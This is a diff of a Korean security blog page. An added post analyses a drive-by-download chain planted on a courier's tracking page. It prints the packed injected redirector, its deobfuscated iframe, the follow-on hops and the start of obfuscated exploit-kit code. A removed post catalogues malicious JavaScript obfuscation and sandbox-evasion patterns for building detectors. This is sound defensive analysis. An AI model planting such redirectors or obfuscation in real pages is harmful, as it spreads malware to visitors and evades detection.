@@ -9,10 +9,7 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="손을 대야 할 것들이 Reflective DLL injection
-Dynamic forking
-Inline hooking stephenfewer/ReflectiveDLLInjection
-을 읽고. Reflective DLL injection is a library &hellip;">
+  <meta name="description" content="EK 가 설치되어 있는 사이트. G마켓 자체 페이지는 아니고, 배송조회하면 연결되는 택배회사의 배송조회 페이지. URL: hxxp://www.yellowcap.co.kr/custom/inquiry_result.asp?INVOICE_NO=81800192001 페이지 &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -68,6 +65,135 @@ Inline hooking stephenfewer/ReflectiveDLLInjection
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2013/08/29/the-long-goodbye/">The Long Goodbye</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2013-08-29T23:58:00+09:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>29</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>11:58 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>EK 가 설치되어 있는 사이트.</p>
+
+<p>G마켓 자체 페이지는 아니고, 배송조회하면 연결되는 택배회사의 배송조회 페이지.</p>
+
+<pre><code>URL: hxxp://www.yellowcap.co.kr/custom/inquiry_result.asp?INVOICE_NO=81800192001
+</code></pre>
+
+<p>페이지 소스를 보니,</p>
+
+<pre><code>&lt;script type="text/javascript" language="javascript" src="/common/js/embed.js"&gt;&lt;/script&gt;
+</code></pre>
+
+<p>로 embed.js 를 땡기고 있었다.</p>
+
+<p>embed.js 를 보니, 마지막에 다음과 같은 redirection code 가 들어있었다.</p>
+
+<pre><code>eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};
+if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];
+e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}
+return p}('d(3.7.c(\'4=\')==-1){e 2=f h();2.g(2.i()+b*5*5*8);3.7=\'4=9;a=/;2=\'+2.j();
+3.p("&lt;6 s=r://u.w/v/t/q/l.k m=n o=0&gt;&lt;/6&gt;")}',33,33,
+'||expires|document|hsblm|60|iframe|cookie|1000|Yes|path|12|indexOf|if|var|new|setTime|Date|getTime|
+toGMTString|html|ye|width|100|height|write|pop|http|src|goods|dangguro|upload|com'.split('|'),0,{}))
+</code></pre>
+
+<p>난독화 해제를 했더니,</p>
+
+<pre><code>if (document.cookie.indexOf('hsblm=') == -1) {
+    var expires = new Date();
+    expires.setTime(expires.getTime() + 12 * 60 * 60 * 1000);
+    document.cookie = 'hsblm=Yes;path=/;expires=' + expires.toGMTString();
+    document.write("&lt;iframe src=http://dangguro.com/upload/goods/pop/ye.html width=100 height=0&gt;&lt;/iframe&gt;")
+}
+</code></pre>
+
+<p>로 dangguro.com 으로 traffic 을 돌리는 iframe 을 삽입한다.</p>
+
+<pre><code>URL: hxxp://dangguro.com/upload/goods/pop/ye.html
+</code></pre>
+
+<p>ye.html 을 봤더니</p>
+
+<pre><code>&lt;iframe src=http://www.zzizile.net//data/geditor/1307/pop/index.html width='1' height='1'&gt;&lt;/iframe&gt;
+</code></pre>
+
+<p>로 다시 redirect 한다.</p>
+
+<pre><code>URL: hxxp://www.zzizile.net//data/geditor/1307/pop/index.html
+</code></pre>
+
+<p>www.zzizile.net 을 따라가 보았다.</p>
+
+<pre><code>&lt;script language="javascript" src="http://count5.51yes.com/click.aspx?id=52194144&amp;logo=1" charset="gb2312"&gt;&lt;/script&gt;
+&lt;script type="text/javascript" src="swfobject.js"&gt;&lt;/script&gt;
+&lt;script src=jpg.js&gt;&lt;/script&gt;
+&lt;script type="text/javascript"&gt;
+var tmoRu2=navigator.userAgent.toLowerCase();
+var NOmT2="1"+"1"+"1";
+if(document.cookie.indexOf("YCAo6=")==-1 &amp;&amp; tmoRu2.indexOf("linux")&lt;=-1 &amp;&amp; tmoRu2.indexOf("bot")==-1 &amp;&amp; tmoRu2.indexOf("spider")==-1)
+{
+var VJhjJoY8=deconcept.SWFObjectUtil.getPlayerVersion();
+var expires=new Date();
+expires.setTime(expires.getTime()+24*60*60*1000);
+NOmT2="0"+"0";
+document.cookie="YCAo6=Yes;path=/;expires="+expires.toGMTString();
+if(document.location.hostname.length&gt;0){pimOD5="1"+"1";delete pimOD5;try{pimOD5+=
+"0"+"0"+"0"+"0"+"0"+"0"+"0"+"0"+"0"+"0";}catch(e){var IzhH1="1";AMJP8 = eval}mOQyUG8=unescape;}
+gROR3="3C7F265941303D6B32471514405B3D4439482417BE6D1343C4453A0FA317510ABF19510EAB045234FF580122B3
+421825FB560261C0511620C225542CD621EE38DA24E031C763FE11DE25E84F9969F319817BBC54CE57EF12B541FA18A501C01FB654
+...
+</code></pre>
+
+<p>로 시작하는 heavily obfuscated 된 자바스크립트가 나온다.</p>
+
+<p>swfobject.js 가 있는 것으로 봐서, 여기서부터 Browser fingerprinting 을 해서, 취약한 부분을 찾아내,
+적절한 공격을 하는 것으로 보인다.</p>
+
+<p>일단 이 화일을 VirusTotal 에 올려보았다.</p>
+
+<p>45 개의 Anti-virus 엔진중에서 19 개가 악성으로 판정하였다. 국산 엔진들은 잡아내지 못했다.</p>
+
+<p>McAfee 는 JS/Exploit-Godakit.a 라고 판정하고 BitDefender 는 JS:Exploit.BlackHole.AL 이라고 판정하였다.</p>
+
+<p>사용된 화일로 봐서는, Gong Da 가 맞다.</p>
+
+<p>Sandbox 에 넣고 돌렸다.</p>
+
+<p>튀어나오는 URL 들은</p>
+
+<pre><code>http://www.uthkorea.com
+
+http://www.monggus.com
+
+http://count18.51yes.com
+
+http://211.43.212.192
+
+http://101.79.5.31
+</code></pre>
+
+<p>이다. count18.51yes.com 은 China Telecom Jiangsu 라는 업체에서 호스팅하고 있다.</p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -1587,517 +1713,6 @@ hi Tab gui=underline guifg=blue ctermbg=blue
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2013/06/01/javascript-obfuscation-patterns/">JavaScript Obfuscation Patterns</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2013-06-01T14:14:00+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>1</span><span class='date-suffix'>st</span>, <span class='date-year'>2013</span></span> <span class='time'>2:14 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>정리하는 목적은 Malicious JavaScript 을 자동으로 판정하기 위함.</p>
-
-<p>그러기 위해서, 악성 자바스크립트에서 쓰는 syntax pattern 을 정리하고, 자동으로 패턴을 찾아내는 것을
-만들려고 함.</p>
-
-<p>지금 생각하는 수순은</p>
-
-<ol>
-<li>단순한 regexp 스트링 매칭</li>
-<li>HTML Parsing</li>
-<li>JavaScript Parsing -> Abstract Syntax Tree 를 빌드해서, visit 하면서, 패턴을 분석</li>
-<li>JavaScript Runtime 을 돌려서 동적으로 생성되는 Symbol table 이나
-Assignment , String mainpulation 을 분석</li>
-</ol>
-
-
-<p>그리고 Drive-by-download 공격의 redirection 의 단계마다 JavaScript Obfuscation 의 패턴이 조금씩 달라지기 때문에.
-이 점도 고려할 필요가 있음.</p>
-
-<ol>
-<li>랜딩페이지에는 주로 다음 단계로 redirection 하는 코드들이 들어있다.</li>
-</ol>
-
-
-<p>중국의 Hidden Lynx 가 수행했다고 의심되는 작전에서 사용된 redirection code</p>
-
-<pre><code>document.write('&lt;script 
-src="http://www.*******curling.com/Docs/BW06/iframe.js"&gt;&lt;/script&gt;');
-</code></pre>
-
-<p>Gongda pack 으로 traffic 을 돌리기 위해 사용된 redirection code</p>
-
-<pre><code>eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};
-if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];
-e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}
-return p}('d(3.7.c(\'4=\')==-1){e 2=f h();2.g(2.i()+b*5*5*8);3.7=\'4=9;a=/;2=\'+2.j();
-3.p("&lt;6 s=r://u.w/v/t/q/l.k m=n o=0&gt;&lt;/6&gt;")}',33,33,
-'||expires|document|hsblm|60|iframe|cookie|1000|Yes|path|12|indexOf|if|var|new|setTime|Date|getTime|
-toGMTString|html|ye|width|100|height|write|pop|http|src|goods|dangguro|upload|com'.split('|'),0,{}))
-</code></pre>
-
-<p>난독화를 해제하면,</p>
-
-<pre><code>if (document.cookie.indexOf('hsblm=') == -1) {
-    var expires = new Date();
-    expires.setTime(expires.getTime() + 12 * 60 * 60 * 1000);
-    document.cookie = 'hsblm=Yes;path=/;expires=' + expires.toGMTString();
-    document.write("&lt;iframe src=http://dangguro.com/upload/goods/pop/ye.html width=100 height=0&gt;&lt;/iframe&gt;")
-}
-</code></pre>
-
-<p>redirection 을 하기 위해서 들어가는 코드들은</p>
-
-<ul>
-<li>간결하고,</li>
-<li>document.write() 로 iframe or script tag 를 뱉어내거나</li>
-<li><p>createElement() 로 script / iframe tag 을 집어 넣는다.</p></li>
-<li><p>다음 단계에서는, 주로 php 가 돌면서 browser fingerprinting 을 하고 적절한 exploit 을 보내준다.
-1 번과 2 번에 들어가는 악성 JavaScript 은 성격이나 패턴이 조금 다르다는 점도 염두에 두려 한다.</p></li>
-</ul>
-
-
-<h2>Patterns</h2>
-
-<h3>Execution</h3>
-
-<p>난독화된 코드를 수행시키는 방법으로는, <code>eval()</code> <code>setTimeout()</code> <code>setInterval()</code> 등이 사용된다.</p>
-
-<h3>Function redefinition</h3>
-
-<p>eval(), unescape(), fromCharCode(), replace(), ActiveXObject() 등의 수상한 함수들을 감추기 위해 사용한다.</p>
-
-<pre><code>&gt; var e=eval;
-&gt; var a=1;
-&gt; e("a=a+1");
-2
-&gt;
-</code></pre>
-
-<p>IDS, IPS, AV 의 패턴 패칭을 우회하기 위해 사용된다.</p>
-
-<h3>document[&ldquo;w&rdquo;+&ldquo;r&rdquo;+&ldquo;ite&rdquo;]</h3>
-
-<p>JavaScript 에서는 method 도 결국 property 에 불과하기때문에, function 을 document[&ldquo;write&rdquo;] 로 부를 수 있다.
-여기서 좀 더 꼬면 document[&ldquo;w&rdquo;+&ldquo;r&rdquo;+&ldquo;ite&rdquo;]</p>
-
-<p>DOM 환경이 아니라서, document.write() 라는 함수를 정의해서 테스트한다.</p>
-
-<pre><code>&gt; document = { write: function(str) { console.log(str); } }
-{ write: [Function] }
-&gt; document.write('hi')
-hi
-&gt; document["w"+"r"+"ite"]('hi')
-hi
-&gt;
-</code></pre>
-
-<p>아니면 &ldquo;write&rdquo; 를 변수에 담아서 호출할수도 있다.</p>
-
-<pre><code>&gt; document = { write: function() { console.log("hi"); } }
-{ write: [Function] }
-&gt; document.write()
-hi
-&gt; a = "w"+"r"+"i"+"t"+"e";
-'write'
-&gt; document[a]();
-hi
-&gt;
-</code></pre>
-
-<p>주로 <code>document.write()</code> <code>document.writeln()</code> <code>this.eval()</code> <code>window.eval()</code> 등에 사용한다.
-브라우저에서 JavaScript Global Scope 에서는 this === window 이기 때문에,
-, <code>this.eval()</code> === <code>window.eval()</code></p>
-
-<h3>Funciton redefinition 2</h3>
-
-<p>node 에서 돌려보자.</p>
-
-<p>node 환경이라서 기본적인 DOM 오브젝이 없다. 대강 window.eval() 을 만들어준다.</p>
-
-<pre><code>&gt; window = { eval: function() { console.log('eval') } }
-{ eval: [Function] }
-&gt; window.eval()
-eval
-&gt; v = "va"+"l"
-'val'
-&gt; window[""+"e"+v]()
-eval
-&gt;
-</code></pre>
-
-<p>즉 function redefinition 패턴 + document[&ldquo;w&rdquo;+&ldquo;r&rdquo;+&ldquo;ite&rdquo;] 패턴을 결합하여</p>
-
-<pre><code>v = "va"+"l"
-e = window[""+"e"+v]
-</code></pre>
-
-<p><code>eval()</code> 함수를 <code>e()</code> 로 은밀하게 옮겼다. 앞으로 <code>e()</code> 를 <code>eval()</code> 대신 사용할 수 있다.</p>
-
-<h3>Function redefinition 3</h3>
-
-<pre><code>b={v:{q:{x:this}}}.v.q.x;
-qq='ghej4vabl'
-q=qq[2]+qq[5]+qq[6]
-q=q+qq[8]
-w={v:b[q]}.v
-</code></pre>
-
-<p><code>w=eval()</code> 펑션이 들어가게 된다. <code>w=this["eval"]</code> 로 만들어지는 것이 포인트.</p>
-
-<p>이런 패턴을 detect 하려면 방법은 2 가지가 있을 것 같은데.</p>
-
-<ol>
-<li>JavaScript runtime 을 붙여서 돌리는 것.</li>
-<li>JavaScript Parser 로 AST 를 빌드하고, 변수의 값을 계산해내는 것. (컴파일러 최적화와 유사. Terminal 노드까지 계산이 가능하다면.)</li>
-</ol>
-
-
-<h3>replace()</h3>
-
-<p>&lsquo;OB3S3FUCA!TED!&rsquo;.replace() 을 통해 난독화된 스트링을 풀어서 사용하는 패턴.</p>
-
-<pre><code>&gt; var a;
-&gt; eval('a=un2scap2'.replace(/2/g,'e'));
-[Function: unescape]
-&gt; var str = escape("BABO?!@")
-&gt; a(str)
-'BABO?!@'
-&gt;
-</code></pre>
-
-<p>a() 로 unescape() 된다.</p>
-
-<p>Function redefinition 을 그냥 하는 것이 아니라, replace() 를 통해서 스트링을 한번 푼다음에, eval() 로 하였다.</p>
-
-<h3>split()</h3>
-
-<p>스트링을 split() 해서 list 를 만든다. 보통 byte list 을 만드는데.
-split() 해서 list 를 만들고, 이 리스트를 Math.sin() 등의 다양한 함수로 가공한 후에, fromCharCode() 로
-스트링으로 복원해서 사용한다. eval() 을 한다던지&hellip; Shellcode 로 쓴다던지.</p>
-
-<pre><code>&gt; n="19~50~57~48".split("a~".substr(1));
-[ '19', '50', '57', '48' ]
-</code></pre>
-
-<p>split() 하는 delimeter 를 숨기기 위해 &ldquo;a~&rdquo;.substr(1) 을 사용하였다.</p>
-
-<h3>unescape()</h3>
-
-<p>%XX%YY 형태로 인코딩 된 녀석을 스트링으로 복원한다.</p>
-
-<h3>fromCharCode()</h3>
-
-<pre><code>&gt; String.fromCharCode(104,0164,0164,112,0x3a,0x2f,0x2f,49,50,067,056,48,0x2e,48,46,49,072,0x38,060,070,060,47,47,112,0165,0x46,0x62,0x4a,111,0146,0124,0143,0172,0x43,89,82,0x75,65,111,81,47);
-'http://127.0.0.1:8080//puFbJofTczCYRuAoQ/'
-&gt;
-</code></pre>
-
-<p><strong>스트링을 split() 해서 list 를 만들고 그 리스트에 Math.sin() 등을 이용한 연산을 돌린 후에,
-String.fromCharCode() 로 다시 스트링으로 복원하여, 최후에 eval() 을 돌린다.</strong> 정도가 가능하다.</p>
-
-<p>또 다른 예:</p>
-
-<pre><code>$ cat x.js
-var i = 0;
-
-for(i=0;i&lt;"iDMMNvNSME".length;i++) {
-    console.log(String.fromCharCode("iDMMNvNSME".charCodeAt(i) ^ 0x21));
-}
-$ node x.js
-H
-e
-l
-l
-o
-W
-o
-r
-l
-d
-</code></pre>
-
-<p>&ldquo;HelloWorld&rdquo; 를 0x21 로 XOR 시켜서 저장해놓았다가, 다시 XOR 로 풀어서 <code>fromCharCode()</code> 로
-캐릭터화했다.</p>
-
-<h3>Script/Iframe injection</h3>
-
-<p><code>document.write()</code> <code>document.writeln()</code> <code>createElement('script')</code> <code>createElement('iframe')</code> <code>createElement("object")</code> 을
-사용하여 동적으로 HTML tag 또는 JS 코드를 삽입/실행시키는 테크닉.</p>
-
-<p>Yang Pack EK 의 Redirector 를 보자.</p>
-
-<pre><code>&lt;script type="text/javascript" src="http://js.xxx.com/2744552/tongji.js"&gt;&lt;/script&gt;&lt;noscript&gt;
-&lt;a href="http://www.xxx.com"&gt;&lt;img src="http://img.xxx.com/2744552/tongji.gif" /&gt;&lt;/noscript&gt;
-
-&lt;script language='JavaScript'&gt;
-function booom1() { document.write("&lt;iframe src='t.html' width='50' height='1'&gt;&lt;/iframe&gt;");}
-...
-</code></pre>
-
-<p>document.write() 로 iframe 을 삽입한다.</p>
-
-<p>블랙홀 EK 에서 iframe 을 삽입하는 코드를 보자.</p>
-
-<pre><code>if (document.getElementsByTagName('body')[0]){
-    iframer();
-} else {
-    document.write("&lt;iframe src="http://[removed]/?go=2' width='10' height='10' style="visibility:hidden;position:absolute;left:0;top:0;'&gt;&lt;/iframe&gt;");
-}
-function iframer() {
-    var f = document.createElement('iframe');
-    f.setAttribute('src', 'http://[removed]/?go=2');
-    f.style.visibility = 'hidden';
-    f.style.position = 'absolute';
-    f.style.left = '0';
-    f.style.top = '0';
-    f.setAttribute('width', '10');
-    f.setAttribute('height', '10');
-    document.getElementsByTagName('body')[0].appendChild(f);
-}
-</code></pre>
-
-<p>createElement() 로 iframe 을 삽입한다.</p>
-
-<h3>try { } catch(e) { }</h3>
-
-<pre><code>&gt; Boolean().prototype.a
-TypeError: Cannot read property 'a' of undefined
-    at repl:1:21
-    at REPLServer.self.eval (repl.js:109:21)
-    at Interface.&lt;anonymous&gt; (repl.js:248:12)
-    at Interface.EventEmitter.emit (events.js:96:17)
-    at Interface._onLine (readline.js:200:10)
-    at Interface._line (readline.js:518:8)
-    at Interface._ttyWrite (readline.js:736:14)
-    at ReadStream.onkeypress (readline.js:97:10)
-    at ReadStream.EventEmitter.emit (events.js:126:20)
-    at emitKey (readline.js:1058:12)
-&gt; try { console.log("1"); Boolean().prototype.a; console.log("2"); } catch(e) { console.log('babo'); }
-1
-babo
-&gt;
-</code></pre>
-
-<p>try {} 에서 일부러 exception 을 발생시켜서, 수행 중간에 catch {} 로 control flow 를 넘긴다.
-정확히 어떤 statement 가 exception 을 발생시키는지 모른다면, control flow 를 짐작할 수 없게 된다.
-Control flow obfuscation 패턴.</p>
-
-<h3>Base64</h3>
-
-<p>HTML 의 몇몇 tag 들은 Base64 인코딩을 풀어서 쓸 수 있다.
-&lt;img> 를 따로 화일로 안만들고 &lt;img tag 에 base64 인코딩을 해서 HTML 화일 1 장에 다 넣을 수가 있는데,
-이것을 이용하는 방법이 있다.
-따로 decoding 루틴을 달 필요가 없기에, 간편하다.</p>
-
-<h3>Radix Conversion</h3>
-
-<pre><code>&gt; -~'0x14f'[720094129.0.toString(2&lt;&lt;4)]
-6
-&gt; -~'0x14f'[720094129.0.toString(2&lt;&lt;4)]
-6
-&gt; 720094129.0.toString(2&lt;&lt;4)
-'length'
-&gt; -~5
-6
-&gt;
-</code></pre>
-
-<p>따라가보자.</p>
-
-<p><code>720094129.0.toString(2&lt;&lt;4)</code> 는 &lsquo;length&rsquo; 가 된다. toString(radix) 로 <code>2&lt;&lt;4</code> 는 32 니까, 32 진법으로
-720094129 를 변환하면 &lsquo;length&rsquo; 가 되는 셈이다. 32 진법에서는 [0-9a-v] 를 사용한다.</p>
-
-<p>&lsquo;0x14f&rsquo;.length 가 되는 셈이고 결국 숫자 5 가 된다. JavaScript 에서 <code>~</code> 는 Bitwise NOT 으로 MSB 가 invert 되니
-음수로 바뀌게 된다.</p>
-
-<p>JavaScript 에서</p>
-
-<pre><code>-1 (base 10) = 1111 1111 1111 1111 1111 1111 1111 1111 (base2)
-</code></pre>
-
-<p>이다. ~0 은 -1 이 된다. -~ 하면 +1 하는 것과 같다.</p>
-
-<p>function 을 redefine 하는 것으로 다시 가보면</p>
-
-<pre><code>&gt; window={eval:function(){console.log("eval");}}
-{ eval: [Function] }
-</code></pre>
-
-<p>이제부터 난독화된 본코드</p>
-
-<pre><code>&gt; var x=490837.0.toString(2&lt;&lt;4);window[x]()
-eval
-&gt;
-</code></pre>
-
-<p>32 진수로 변환해서 &lsquo;eval&rsquo; 이라는 스트링을 얻어냈다.
-window.eval() 을 아주 힘들게 호출했다. 이 정도까지 가면, 패턴 검색정도로는 &ldquo;eval&rdquo; 이라는 스트링을 찾을 수 없다.</p>
-
-<h3>Math</h3>
-
-<pre><code>&gt; Math.log(Math.E)
-1
-</code></pre>
-
-<p>-2 가 필요하면 -2*Math.log(Math.E) 를 사용한다. 간단하지만, 수학울렁증이 있으면 멘탈이 흔들린다.</p>
-
-<p>Math.PI 와 Math.sin() 등을 이용해 x = [ 125.5, 49.5, &hellip; ] 등의 리스트를 가공한다음에 fromCharCode() 를 사용해서
-스트링으로 원복하는 패턴.</p>
-
-<p>다음에는 그냥 쓸데없이 다양한 radix base 의 숫자를 써서 수학 울렁증을 유발시키는 패턴.</p>
-
-<pre><code>&gt; if(020==0x10) console.log('babo')
-babo
-</code></pre>
-
-<p>귀찮게 020 == 0x10 등의 conditional 을 중간 중간에 넣어 헤깔리게 만든다.</p>
-
-<h3>OnMouseMove 핸들러</h3>
-
-<pre><code>document.onmousemove = function() {
-    ...
-    var head = document.getElementsByTagName("head")[0]
-    var script = document.createElement("script")
-    script.type = "text/javascript"
-    script.onreadystatechange = function() {
-        if (this.readyState == "complete") window.handler_state = 2;
-    }
-    script.onload = function() { window.handler_state = 2; }
-    script.src = url + "1x2.js"
-    head.appendChild(script)
-    ...
-}
-</code></pre>
-
-<p>VM 기반의 자동화된 동적 분석에 대항하기 위한 테크닉. 마우스가 움직이면
-&lt;script src=&ldquo;xxx.js&rdquo;> 를 DOM 트리의 &lt;head> 밑에 밀어 넣는다.
-자동화된 VM 분석에 대항하면서, Control flow 를 숨기는 패턴.</p>
-
-<ol>
-<li>VMware / VirtualBox 를 통해 동적분석을 하려하거나,</li>
-<li>JavaScript runtime + DOM emulation 을 가지고 JavaScript 을 인터프리팅하는</li>
-</ol>
-
-
-<p>자동화된 분석 도구를 피해가기 위한 목적이 크다.</p>
-
-<h3>HTML <tag></h3>
-
-<p>HTML tag 에 데이터를 숨기는 기법이다. &lt;iframe> redirection code 를 inject 할 때 자주 사용된다.</p>
-
-<pre><code>&lt;x id="babo" style="display:none"&gt;
-123456789
-&lt;/x&gt;
-
-&lt;script&gt;
-var x= document.getElementById("babo");
-alert(x.innerHTML);
-&lt;/script&gt;
-</code></pre>
-
-<p>&lt;x>&hellip;&lt;/x>  안에 인코딩된 스트링을 숨기고, &lt;script>&lt;/script> 블럭에서 디코딩을 해서,
-&lt;iframe> 태그를 document.write 또는 createElement(&lsquo;iframe&rsquo;) 을 통해서 inject 한다.
-JavaScript 블럭만 정적 분석을 해서는 발견하기가 어렵다.</p>
-
-<h3>Silly Tricks</h3>
-
-<p>조금씩 비트는 수준의 테크닉들이 있다.</p>
-
-<p><code>a = { q:"string" }.q;</code> 는 <code>a="string"</code> 과 같다.</p>
-
-<p>좀 더 비틀어보자.</p>
-
-<p><code>b={v:{q:{x:"string"}}}.v.q.x</code> 은 <code>b="string"</code> 과 같다.</p>
-
-<pre><code>&gt; a = {q:"string"}.q
-'string'
-&gt; a
-'string'
-&gt; b={v:{q:{x:"string"}}}.v.q.x
-'string'
-&gt; b
-'string'
-&gt;
-</code></pre>
-
-<p>이건 for loop 를 비트는 흔한 기술법. <code>for(i=0;i-3782&lt;0;i++){...}</code> 는 <code>for(i=0;i&lt;3782;i++){...}</code> 와 같다.
-아니면 변수를 RHS 에 놓는다. <code>for(i=0;0&gt;i-3782;i=-~i)</code></p>
-
-<pre><code>&gt; for(i=0;0&gt;i-5;i=-~i)console.log(i);
-0
-1
-2
-3
-4
-&gt;
-</code></pre>
-
-<h3>Analysis</h3>
-
-<h4>Static Approach</h4>
-
-<p>지금 생각에 Index of Coincidence, Consonant Ratio, Special Character Ratio 등은 큰 의미가 없을 것 같다.</p>
-
-<p>가정과 질문들은</p>
-
-<ul>
-<li>Redirection 을 해주는 1 단계 페이지들과 감염을 시키는 2 단계 페이지들을 분석할 때 방법론이 다르다.</li>
-<li>모든 악성 웹사이트의 HTML/JavaScript 이 난독화 되어있지는 않다. 담백하게 작성된 것도 적지 않다.</li>
-<li><p>VM 전단계에서 fast-filtering 을 목적으로 하는가 아니면, 특정부분은 VM 보다 나을 수 있는 Client Honeypot 시스템을 만드는가?</p></li>
-<li><p>다음 각각은 특정한 용도가 있다.</p></li>
-</ul>
-
-
-<ol>
-<li>CVE 중심으로 signature 를 찾는 것</li>
-<li>HTML 정적 분석</li>
-<li>JavaScript 정적 분석</li>
-<li>JS 인터프리터와 DOM 에뮬레이터로 동적 분석하는 것</li>
-<li>VM 기반의 동적 분석</li>
-</ol>
-
-
-<p>그리고 메모.</p>
-
-<ul>
-<li>AST 를 파싱해서 loop construct 안에 다량의 스트링 concatenation 이 있는 패턴을 잡기 위한 룰</li>
-<li>for loop construct 하부 트리에 fromCharCode() 나 fromCharCode 의 clone 이 있는 패턴.</li>
-<li>&lt;tag id=&ldquo;xyz&rdquo;> Encrypted Data &lt;tag> 와 같은 패턴을 잡기 위한 룰</li>
-<li>Misplaced &lt;iframe> &amp; &lt;script>: &lt;html> 밖에 위치해 있거나, &lt;head> &lt;body> 의 밖에 위치한 태그들.</li>
-<li>파싱해서 Tree 를 visit 하다가, MemberExpression 안에 BinaryExpression &lsquo;+&rsquo; 가 들어가 있으면 의심해볼 만하다. 정상적인 경우에는 <code>my_object["first_name"]</code> 이런 식으로 코딩하지, <code>my_object["first"+"_"+"name"]</code> 이렇게는 잘 안한다. String 을 [Function] 으로 변환하기 위해서는 String 이라던가 document 라던가 window 의 멤버 참조로 할 수 밖에 없기 때문에.</li>
-</ul>
-
-
-<pre>
-> s=String;
-[Function: String]
-> f="f"+"r"+"omChar"
-'fromChar'
-> s[f+"Code"]
-[Function: fromCharCode]
-</pre>
-
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/22">&larr; Older</a>
@@ -2115,6 +1730,10 @@ JavaScript 블럭만 정적 분석을 해서는 발견하기가 어렵다.</p>
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/06/20/iphone-security/">iPhone Security</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2016/06/17/cve-2016-0728/">CVE-2016-0728</a>
       </li>
     
@@ -2128,10 +1747,6 @@ JavaScript 블럭만 정적 분석을 해서는 발견하기가 어렵다.</p>
     
       <li class="post">
         <a href="/blog/2016/06/14/hitcon-ctf-2014-unexploitable-heap-overflow/">HITCON CTF 2014 'Unexploitable' Heap Overflow</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/06/14/glibc-adventures-the-forgotten-chunks/">Glibc Adventures: The Forgotten Chunks</a>
       </li>
     
   </ul>
